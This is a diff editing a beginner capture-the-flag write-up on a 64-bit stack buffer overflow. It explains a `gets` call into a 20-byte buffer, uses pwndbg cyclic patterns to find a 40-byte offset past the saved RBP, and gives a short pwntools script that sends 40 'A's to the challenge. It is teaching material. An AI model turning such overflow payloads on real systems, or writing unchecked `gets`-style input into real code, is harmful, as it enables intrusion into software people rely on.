@@ -43,11 +43,19 @@ This function will give us our flag. How do we start?
 In `vuln`:
 
 ```c
+    // buffer size
+    char buffer[20]; 
+    printf("Enter some text: ");
+    
     // vulnerable c function
     gets(buffer);
 ```
 
-One of the most common C vulnerabilities. This function does not perform boundary checking, which means it will accept user input even if it is beyond allocated size.
+`buffer` variable is assigned to hold 20 bytes only. However, it is followed by a `gets` function
+
+`gets` function is one of the most common C vulnerabilities. This function does not perform boundary checking, which means it will accept user input even if it is beyond allocated size.
+
+This can be observed later on when we try to epxloit it.
 
 ### Buffer overflow
 
@@ -55,11 +63,11 @@ To put it simply, let's say a basket can hold 10 apples at maxmimum. But if I we
 
 In programs, excess bytes will overflow into other values/addresses on the stack memory. 
 
+or the better way to put it: It will overflow from **lower** to **higher** address on the stack memory.
+
 ### What is Segmentation Fault? How does it happen?
 
 This is an error that occurs when a program attempts to access memory that is **not permitted to the user**. 
-
-
 
 For example: reading/writing outside given boundaries (aka Buffer overflow).
 
@@ -67,9 +75,9 @@ There are 2 important addresses in a stack frame that is **not permitted** to us
 1. saved base pointer (RBP) address
 2. return address
 
-**HOWEVER**, it is important to note that if you overwrite the addresses with an existing/valid address in the binary, it will continue running but with the overwritten address.
+**HOWEVER**, it is important to note that if you overwrite the addresses with an existing/valid address in the binary, it will continue running with the overwritten address instead.
 
-Let's try to overflow the **base pointer address** since it is always closer to the buffer.
+Let's try to overflow the **base pointer address/RBP** since it is always closer to the buffer. (recall in pancakes)
 
 
 ### Find number of bytes to overflow base pointer address
@@ -79,7 +87,7 @@ Let's try to overflow the **base pointer address** since it is always closer to 
 $> gdb chall
 ```
 
-2. Generate the cyclic pattern of 100 bytes (or any number big enough to cause a segmentation fault) & copy the output
+2. Generate the cyclic pattern of 100 bytes. This cyclic sequence helps uses to identify what address or how many bytes we want to overwrite.
 ```shell
 pwndbg> cyclic 100
 aaaaaaaabaaaaaaacaaaa...
@@ -96,11 +104,33 @@ You should be able to observe this in the registers:
  RSP  0x7fffffffdc48 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
 ```
 
-This was from our cyclic pattern. This pattern helps us to identify how many bytes we need **before** it goes into whichever part of the stack we want.
+You can observe the program taking all 100 bytes of our cyclic input, even though `buffer` can only hold 20 bytes. Thus, buffer overflow.
 
-In 64-bit programs, after the `RBP` is overflowed, the remaining will go into the `RSP` register.
+### Cyclic pattern
 
-So in this case,`faaaaaaa` will point to us how many bytes we need to **completely** overwrite saved RBP address.
+```shell
+ RBP  0x6161616161616165 ('eaaaaaaa')
+```
+
+You can see that `eaaaaaaa` is in `RBP`. It was mentioned earlier that it helps us identify how many bytes we want to overwrite.
+
+Let's run this command to check:
+
+```shell
+pwndbg> cyclic -l eaaaaaaa
+Finding cyclic pattern of 8 bytes: b'eaaaaaaa' (hex: 0x6561616161616161)
+Found at offset 32
+```
+
+This actually means if want to overflow into `RBP`, we need to have at least 32 bytes.
+
+However, since our goal is to **completely** overflow `RBP`, we another more 8 bytes, which is in `RSP`.
+
+```shell
+ RSP  0x7fffffffdc48 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
+```
+
+We will take the first 8 bytes that overflowed, which is `faaaaaaa`.
 
 Let's identify how many bytes we need with the following command below:
 ```shell
@@ -108,6 +138,8 @@ pwndbg> cyclic -l faaaaaaa
 Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
 Found at offset 40
 ```
+
+This means in order to completely overflow `RBP` and cause the segmentation fault, we need at least 40 bytes.
 
 ### Manual Exploit 
 Let's put 40 bytes of input (in this case I will put 40 `A`s) into the program, let's see what happens
@@ -137,7 +169,7 @@ from pwn import *
 p = process("./chall")
 
 # remote solve
-p = process("IP", PORT)
+p = remote("IP", PORT)
 ```
 
 3. Since we want to send 40 `A`s:
@@ -155,8 +187,11 @@ When we put all that together u should get this:
 ```python
 from pwn import *
 
-# setup process
-p = remote("ip", port)
+# local solve
+p = process("./chall")
+
+# remote solve
+p = remote("IP", PORT)
 
 # payload 
 payload = b'A' * 40
@@ -170,6 +205,12 @@ Run in your terminal to solve:
 ```shell
 $> python3 script.py
 ```
+
+### QNA
+
+Q: How do we know how many bytes of the cyclic pattern to generate?
+A: Usually, you can just put a number big enough to observe the `RBP` and `RSP` overflowed with your cyclic pattern, or enough to cause a SIGSEGV fault
+
 
 ## Solution
 Refer to solve.py.
